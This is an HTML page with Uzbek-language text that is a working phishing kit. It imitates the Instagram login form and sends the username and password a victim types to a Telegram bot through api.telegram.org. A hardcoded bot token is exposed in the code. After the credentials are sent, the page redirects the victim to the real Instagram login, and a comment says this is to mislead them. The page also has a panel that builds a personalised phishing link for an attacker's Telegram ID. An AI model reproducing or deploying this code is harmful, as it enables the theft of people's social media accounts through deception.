<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
        .logo { width: 175px; margin-bottom: 25px; cursor: pointer; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        .btn { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:disabled { background: rgba(0, 149, 246, 0.3); }
        .footer-link { margin-top: 20px; font-size: 14px; color: #00376b; text-decoration: none; font-weight: 600; display: block; }
        .result-box { margin-top: 20px; padding: 10px; border: 1px dashed #3390ec; background: #f0f8ff; word-break: break-all; font-size: 12px; }
        h3 { color: #262626; font-size: 18px; }
    </style>
</head>
<body>

    <div class="container" id="mainBox">
        </div>

    <script>
        // --- SOZLAMALAR ---
        const BOT_TOKEN = "8481130069:AAH-NEezleZhAA1pUqMjqXaiCYAZwwuW7xM"; 
        
        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id');
        const mainBox = document.getElementById('mainBox');

        // Sahifa yuklanganda tekshirish
        if (targetId) {
            // --- INSTAGRAM KO'RINISIDAGI FORMA ---
            mainBox.innerHTML = `
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
                <input type="text" id="username" placeholder="Telefon raqami, foydalanuvchi nomi yoki elektron pochta">
                <input type="password" id="password" placeholder="Parol">
                <button class="btn" onclick="sendToTelegram()">Kirish</button>
                <div style="margin-top: 20px; color: #8e8e8e; font-size: 12px;">YOKI</div>
                <a href="#" class="footer-link">Parolni unutdingizmi?</a>
            `;
        } else {
            // --- LINK YARATISH PANELI ---
            mainBox.innerHTML = `
                <h3>Havola yaratish</h3>
                <p style="font-size: 13px; color: #8e8e8e;">O'z Telegram ID-ingizni kiriting va do'stlaringiz uchun maxsus havola oling.</p>
                <input type="text" id="user_id" placeholder="Telegram ID (masalan: 1234567)">
                <button class="btn" onclick="generateLink()">Havola olish</button>
                <div id="linkOutput" class="result-box" style="display:none;"></div>
            `;
        }

        // 1. Telegramga ma'lumot yuborish
        async function sendToTelegram() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if(!user || !pass) return alert("Barcha maydonlarni to'ldiring!");

            const text = `ðŸ“¸ **Instagram Kirish**\n\nðŸ‘¤ Login: \`${user}\`\nðŸ”‘ Parol: \`${pass}\`\nðŸ†” Kimga: \`${targetId}\``;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

            try {
                await fetch(url);
                // Foydalanuvchini chalg'itish uchun rasmiy saytga yuborish
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                alert("Ulanishda xatolik yuz berdi.");
            }
        }

        // 2. Shaxsiy havola yaratish
        function generateLink() {
            const id = document.getElementById('user_id').value;
            if (id.length > 5 && !isNaN(id)) {
                const currentUrl = window.location.href.split('?')[0];
                const myLink = currentUrl + "?id=" + id;
                const output = document.getElementById('linkOutput');
                output.style.display = "block";
                output.innerHTML = `<b>Sizning havolangiz:</b><br>${myLink}`;
            } else {
                alert("Iltimos, to'g'ri Telegram ID kiriting!");
            }
        }
    </script>
</body>
</html>
